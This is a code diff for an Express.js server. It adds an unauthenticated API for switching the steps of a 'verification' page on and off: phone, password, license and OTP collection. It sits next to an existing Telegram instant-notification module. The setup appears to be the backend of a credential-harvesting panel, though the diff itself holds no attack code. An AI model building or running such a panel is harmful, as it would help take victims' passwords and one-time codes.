@@ -5,6 +5,7 @@ const cors = require('cors');
 const path = require('path');
 const connectDB = require('./config/db');
 const Verification = require('./models/Verification');
+const PageSettings = require('./models/PageSettings');
 const telegramNotifier = require('./config/telegramNotifier');
 
 const app = express();
@@ -19,6 +20,35 @@ const io = new Server(server, {
 let isMongoConnected = false;
 // Fallback in-memory persistence if MongoDB is offline
 const localVerifications = [];
+let pageSettings = {
+    requirePhone: true,
+    requirePassword: true,
+    requireLicense: true,
+    requireOtp: true
+};
+
+async function initPageSettings(connected) {
+    try {
+        if (connected) {
+            let doc = await PageSettings.findOne();
+            if (!doc) {
+                doc = new PageSettings(pageSettings);
+                await doc.save();
+                console.log('[PageSettings] Created default PageSettings in MongoDB.');
+            } else {
+                pageSettings = {
+                    requirePhone: doc.requirePhone !== false,
+                    requirePassword: doc.requirePassword !== false,
+                    requireLicense: doc.requireLicense !== false,
+                    requireOtp: doc.requireOtp !== false
+                };
+                console.log('[PageSettings] Loaded PageSettings from MongoDB:', pageSettings);
+            }
+        }
+    } catch (err) {
+        console.error('[PageSettings] Error loading from MongoDB:', err.message);
+    }
+}
 
 // Middlewares
 app.use(cors());
@@ -30,6 +60,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 connectDB().then((connected) => {
     isMongoConnected = connected;
     telegramNotifier.initPersistedSettings(connected);
+    initPageSettings(connected);
 });
 
 // REST API Endpoints
@@ -114,6 +145,52 @@ app.post('/api/telegram-settings/test', async (req, res) => {
         res.json({ success: true, message: '⚡ تم إرسال إشعار تليجرام الفوري بنجاح!' });
     } catch (err) {
         res.status(400).json({ success: false, message: err.message });
+    }
+});
+
+// ========== Page Flow & Verification Steps Settings API ==========
+
+app.get('/api/page-settings', (req, res) => {
+    res.json({
+        success: true,
+        settings: pageSettings
+    });
+});
+
+app.post('/api/page-settings', async (req, res) => {
+    try {
+        const { requirePhone, requirePassword, requireLicense, requireOtp } = req.body;
+        pageSettings = {
+            requirePhone: requirePhone !== false,
+            requirePassword: requirePassword === true || requirePassword === 'true',
+            requireLicense: requireLicense === true || requireLicense === 'true',
+            requireOtp: requireOtp === true || requireOtp === 'true'
+        };
+
+        if (isMongoConnected) {
+            let doc = await PageSettings.findOne();
+            if (!doc) {
+                doc = new PageSettings(pageSettings);
+            } else {
+                doc.requirePhone = pageSettings.requirePhone;
+                doc.requirePassword = pageSettings.requirePassword;
+                doc.requireLicense = pageSettings.requireLicense;
+                doc.requireOtp = pageSettings.requireOtp;
+            }
+            await doc.save();
+        }
+
+        io.emit('page_settings_updated', pageSettings);
+        console.log('[PageSettings] Updated and broadcasted page settings:', pageSettings);
+
+        res.json({
+            success: true,
+            settings: pageSettings,
+            message: 'تم حفظ إعدادات خطوات الصفحة بنجاح'
+        });
+    } catch (err) {
+        console.error('[PageSettings] Save error:', err);
+        res.status(500).json({ success: false, error: err.message });
     }
 });
 
